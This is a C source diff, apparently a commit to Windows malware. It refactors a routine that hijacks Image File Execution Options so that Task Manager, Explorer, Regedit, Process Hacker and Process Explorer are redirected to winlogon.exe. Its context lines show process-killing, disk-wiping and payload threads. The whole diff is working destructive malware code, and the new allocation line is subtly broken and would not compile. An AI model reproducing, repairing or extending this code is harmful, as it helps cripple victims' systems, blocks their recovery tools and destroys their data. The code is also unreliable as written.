@@ -89,18 +89,23 @@ void TerminateProcessName(LPCWSTR lpProcessname)
 	CloseHandle(hProcessSnapshot);
 }
 
-void SetImageFileExecution(LPCWSTR lpKeyWithProgramName)
+void SetImageFileExecution(LPCWSTR lpProgramName)
 {
-	HKEY key;
-	LPCWSTR data = L"winlogon.exe";
-	RegCreateKeyExW(HKEY_LOCAL_MACHINE, lpKeyWithProgramName, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &key, NULL);
+        WCHAR wRegPath[MAX_PATH * 2] = (WCHAR)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, (sizeof(WCHAR) + 1) * (MAX_PATH * 2));
+        lstrcpyW(wRegPath, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\");
+        lstrcatW(wRegPath, lpProgramName);
+ 
+	HKEY hKey;
+	LPCWSTR lpData = L"winlogon.exe";
+	RegCreateKeyExW(HKEY_LOCAL_MACHINE, wRegPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
 
-	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, lpKeyWithProgramName, 0, KEY_SET_VALUE | KEY_ALL_ACCESS, &key) == ERROR_SUCCESS)
+	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, wRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
 	{
-		RegSetValueExW(key, L"Debugger", 0, REG_SZ, (LPBYTE)data, (wcslen(data) + 1) * sizeof(WCHAR));
+		RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, (LPBYTE)lpData, (wcslen(lpData) + 1) * sizeof(WCHAR));
 
 	}
-	RegCloseKey(key);
+	RegCloseKey(hKey);
+        HeapFree(hHeap, NULL, wRegPath);
 }
 
 DWORD WINAPI wipedisk(IN LPVOID lpParam)
@@ -452,13 +457,13 @@ int main()
 	TerminateProcessName(L"procexp64.exe");
 	TerminateProcessName(L"procexp64a.exe");
 
-	SetImageFileExecution(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe");
-	SetImageFileExecution(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe");
-	SetImageFileExecution(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit.exe");
-	SetImageFileExecution(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ProcessHacker.exe");
-	SetImageFileExecution(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp.exe");
-	SetImageFileExecution(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp64.exe");
-	SetImageFileExecution(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp64a.exe");
+	SetImageFileExecution(L"taskmgr.exe");
+	SetImageFileExecution(L"explorer.exe");
+	SetImageFileExecution(L"regedit.exe");
+	SetImageFileExecution(L"ProcessHacker.exe");
+	SetImageFileExecution(L"procexp.exe");
+	SetImageFileExecution(L"procexp64.exe");
+	SetImageFileExecution(L"procexp64a.exe");
 
 	LPSTARTUPINFOW lpsi = (LPSTARTUPINFOW)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(STARTUPINFOW));
 	LPPROCESS_INFORMATION lppi = (LPPROCESS_INFORMATION)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(PROCESS_INFORMATION));
@@ -478,6 +483,8 @@ int main()
 	HANDLE hmagnetargdipayloads = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)magnetargdipayloads, NULL, NULL, NULL);
 	SetThreadPriority(hmagnetargdipayloads, REALTIME_PRIORITY_CLASS);
 	WaitForSingleObject(hmagnetargdipayloads, INFINITE);
+        CloseHandle(lppi->hProcess);
+        CloseHandle(lppi->hThread);
 	HeapFree(hHeap, NULL, lpsi);
 	HeapFree(hHeap, NULL, lppi);
 	CloseHandle(hHeap);
